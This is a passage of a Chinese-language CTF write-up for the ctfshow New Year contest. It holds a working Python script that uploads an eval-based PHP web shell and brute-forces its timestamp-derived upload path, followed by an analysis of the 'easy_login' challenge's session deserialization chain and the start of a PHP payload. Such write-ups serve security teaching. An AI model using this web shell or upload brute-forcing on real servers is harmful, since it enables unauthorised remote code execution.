</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Android&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>init</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>route</span><span class=o>=</span><span class=s2>&#34;?url=&#34;</span><span class=o>+</span><span class=n>url</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=n>route</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getPrefix</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>route</span><span class=o>=</span><span class=s2>&#34;index/upload/image&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;file&#34;</span><span class=p>:(</span><span class=s2>&#34;1.php&#34;</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;&lt;?php echo &#39;ctfshow&#39;;eval($_POST[1]);?&gt;&#34;</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=n>route</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>file</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>response_date</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;date&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;正在获取服务器时间：&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response_date</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>date_time_obj</span> <span class=o>=</span> <span class=n>datetime</span><span class=o>.</span><span class=n>strptime</span><span class=p>(</span><span class=n>response_date</span><span class=p>,</span> <span class=s2>&#34;</span><span class=si>%a</span><span class=s2>, </span><span class=si>%d</span><span class=s2> %b %Y %H:%M:%S %Z&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>date_time_obj</span> <span class=o>=</span> <span class=n>date_time_obj</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>tzinfo</span><span class=o>=</span><span class=n>pytz</span><span class=o>.</span><span class=n>timezone</span><span class=p>(</span><span class=s1>&#39;GMT&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>date_time_obj_gmt8</span> <span class=o>=</span> <span class=n>date_time_obj</span><span class=o>.</span><span class=n>astimezone</span><span class=p>(</span><span class=n>pytz</span><span class=o>.</span><span class=n>timezone</span><span class=p>(</span><span class=s1>&#39;Asia/Shanghai&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;正在转换服务器时间：&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>date_time_obj_gmt8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>year</span> <span class=o>=</span> <span class=n>date_time_obj_gmt8</span><span class=o>.</span><span class=n>year</span>
</span></span><span class=line><span class=cl>    <span class=n>month</span> <span class=o>=</span> <span class=n>date_time_obj_gmt8</span><span class=o>.</span><span class=n>month</span>
</span></span><span class=line><span class=cl>    <span class=n>day</span> <span class=o>=</span> <span class=n>date_time_obj_gmt8</span><span class=o>.</span><span class=n>day</span>
</span></span><span class=line><span class=cl>    <span class=n>hour</span> <span class=o>=</span> <span class=n>date_time_obj_gmt8</span><span class=o>.</span><span class=n>hour</span>
</span></span><span class=line><span class=cl>    <span class=n>minute</span> <span class=o>=</span> <span class=n>date_time_obj_gmt8</span><span class=o>.</span><span class=n>minute</span>
</span></span><span class=line><span class=cl>    <span class=n>second</span> <span class=o>=</span> <span class=n>date_time_obj_gmt8</span><span class=o>.</span><span class=n>second</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>scriptDate</span><span class=p>,</span><span class=n>prefix</span>
</span></span><span class=line><span class=cl>    <span class=n>scriptDate</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>year</span><span class=p>)</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>month</span><span class=p>)</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=o>+</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=s2>&#34;0&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>day</span><span class=p>))</span> <span class=k>if</span> <span class=n>day</span><span class=o>&lt;</span><span class=mi>10</span> <span class=k>else</span> <span class=nb>str</span><span class=p>(</span><span class=n>day</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>scriptDate</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>seconds</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>date_time_obj_gmt8</span><span class=o>.</span><span class=n>timestamp</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;服务器时间：&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>seconds</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&#39;&#39;php -r &#34;echo mktime(</span><span class=si>{</span><span class=n>hour</span><span class=si>}</span><span class=s1>,</span><span class=si>{</span><span class=n>minute</span><span class=si>}</span><span class=s1>,</span><span class=si>{</span><span class=n>second</span><span class=si>}</span><span class=s1>,</span><span class=si>{</span><span class=n>month</span><span class=si>}</span><span class=s1>,</span><span class=si>{</span><span class=n>day</span><span class=si>}</span><span class=s1>,</span><span class=si>{</span><span class=n>year</span><span class=si>}</span><span class=s1>);&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;脚本时间：&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>code</span><span class=p>,</span><span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>capture_output</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>script_time</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>script_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>seconds</span> <span class=o>==</span> <span class=n>script_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;时间碰撞成功，开始爆破毫秒&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>prefix</span> <span class=o>=</span>  <span class=n>seconds</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;错误，服务器时间和脚本时间不一致&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>remove_trailing_zero</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>num</span> <span class=o>%</span> <span class=mi>1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>str_num</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>str_num</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;0&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>str_num</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>num</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>checkUrl</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;url.txt&#34;</span><span class=p>,</span><span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>scriptDate</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>prefix</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;.&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span><span class=o>=</span><span class=nb>str</span><span class=p>(</span><span class=n>remove_trailing_zero</span><span class=p>(</span><span class=nb>float</span><span class=p>(</span><span class=n>target</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=c1># target=remove_trailing_zero(target)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>md5</span> <span class=o>=</span><span class=n>string_to_md5</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># route = &#34;/uploads/&#34;+target+scriptDate+&#34;/&#34;+md5+&#34;.php&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>route</span> <span class=o>=</span> <span class=s2>&#34;/uploads/&#34;</span><span class=o>+</span><span class=n>scriptDate</span><span class=o>+</span><span class=s2>&#34;/&#34;</span><span class=o>+</span><span class=n>md5</span><span class=o>+</span><span class=s2>&#34;.php&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;正在爆破&#34;</span><span class=o>+</span><span class=n>url</span><span class=o>+</span><span class=n>route</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=n>route</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;成功getshell，地址为 &#34;</span><span class=o>+</span><span class=n>url</span><span class=o>+</span><span class=n>route</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>        <span class=n>h</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>route</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;爆破结束&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>string_to_md5</span><span class=p>(</span><span class=n>string</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>md5_val</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>md5_val</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>init</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>getPrefix</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>checkUrl</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>看着像是西湖竞争的那种感觉</p><h2 id=easy_login>easy_login</h2><p>0DAY，代码都没多少，看看</p><p><a class=link href=https://gitee.com/ctfshow/easy-login target=_blank rel=noopener>源码</a></p><h3 id=预期>预期</h3><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-184831.jpg width=1299 height=996 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-184831_hu_9194574ec9c43462.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-184831_hu_e20f9a831845fbf.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=130 data-flex-basis=313px></p><p>默认为main路由，紧接着看到上面的<code>userLogger</code>类</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>userLogger</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=s2>&#34;log.txt_</span><span class=si>$this-&gt;username</span><span class=s2>-</span><span class=si>$this-&gt;password</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=s2>&#34;最后操作时间：&#34;</span><span class=o>.</span><span class=nx>date</span><span class=p>(</span><span class=s2>&#34;Y-m-d H:i:s&#34;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34; 用户名 </span><span class=si>$this-&gt;username</span><span class=s2> 密码 </span><span class=si>$this-&gt;password</span><span class=s2> </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$d</span> <span class=o>=</span> <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span><span class=nv>$data</span><span class=p>,</span><span class=nx>FILE_APPEND</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>setLogFileName</span><span class=p>(</span><span class=nv>$filename</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>=</span> <span class=s2>&#34;log.txt&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>user_register</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span> <span class=o>=</span> <span class=nv>$username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>=</span> <span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=s2>&#34;操作时间：&#34;</span><span class=o>.</span><span class=nx>date</span><span class=p>(</span><span class=s2>&#34;Y-m-d H:i:s&#34;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;用户注册： 用户名 </span><span class=si>$username</span><span class=s2> 密码 </span><span class=si>$password\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span><span class=nv>$data</span><span class=p>,</span><span class=nx>FILE_APPEND</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>user_login</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span> <span class=o>=</span> <span class=nv>$username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>=</span> <span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=s2>&#34;操作时间：&#34;</span><span class=o>.</span><span class=nx>date</span><span class=p>(</span><span class=s2>&#34;Y-m-d H:i:s&#34;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;用户登陆： 用户名 </span><span class=si>$username</span><span class=s2> 密码 </span><span class=si>$password\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span><span class=nv>$data</span><span class=p>,</span><span class=nx>FILE_APPEND</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>user_logout</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=s2>&#34;操作时间：&#34;</span><span class=o>.</span><span class=nx>date</span><span class=p>(</span><span class=s2>&#34;Y-m-d H:i:s&#34;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;用户退出： 用户名 </span><span class=si>$this-&gt;username\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span><span class=nv>$data</span><span class=p>,</span><span class=nx>FILE_APPEND</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// public function __destruct(){
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//     $data = &#34;最后操作时间：&#34;.date(&#34;Y-m-d H:i:s&#34;).&#34; 用户名 $this-&gt;username 密码 $this-&gt;password \n&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//     $d = file_put_contents($this-&gt;filename,$data,FILE_APPEND);
</span></span></span><span class=line><span class=cl><span class=c1></span>        
</span></span><span class=line><span class=cl>    <span class=c1>// }
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>参数可控在<code>__construct()</code>可以getshell</p><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-185225.jpg width=1368 height=633 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-185225_hu_6c8e422c1160db29.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-185225_hu_67480ccd9c530096.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=216 data-flex-basis=518px></p><p><code>session_decode</code>向session中存对象，<code>$data = $_SESSION['user'];</code>中从中取出，很明显的session反序列化，而且在<code>main.php</code>中看到了触发的情况</p><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-185523.jpg width=1206 height=570 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-185523_hu_4657afbd7a8fb141.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-185523_hu_7a34d0534077824c.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=211 data-flex-basis=507px></p><p>同时还要满足这个条件</p><p><img src=/p/ctfshow-new-year-water-friends-match/QQ20250124-185848.jpg width=1140 height=396 srcset="/p/ctfshow-new-year-water-friends-match/QQ20250124-185848_hu_3796484a4fd8d60f.jpg 480w, /p/ctfshow-new-year-water-friends-match/QQ20250124-185848_hu_c3fde8b316ce5c0d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=287 data-flex-basis=690px></p><p>我们的目的是返回为NULL值，那就直接在username里面写<code>|</code>即可达成目的，不用看md5，那么现在写触发链，当<code>ATTR_DEFAULT_FETCH_MODE</code>指定为<code>262152</code>，就会将结果的第一列作为类名进行新建对象</p><blockquote><p>在初始化属性值时，sql 的列名就对应者类的属性名，如果存在某个列名，但在该类中不存在这个属性名，在赋值时就会触发类的_set 方法，属性初始化结束之后会调用一次__construct</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>cookie_helper</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$secret</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>mysql_helper</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$db</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$option</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nx>PDO</span><span class=o>::</span><span class=na>ATTR_DEFAULT_FETCH_MODE</span> <span class=o>=&gt;</span> <span class=mi>262152</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>init</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>init</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>db</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>application</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cookie</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$mysql</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$dispather</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$loger</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$debug</span><span class=o>=</span><span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>cookie_helper</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mysql</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysql_helper</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dispatcher</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>dispatcher</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>loger</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>userLogger</span><span class=p>();</span>
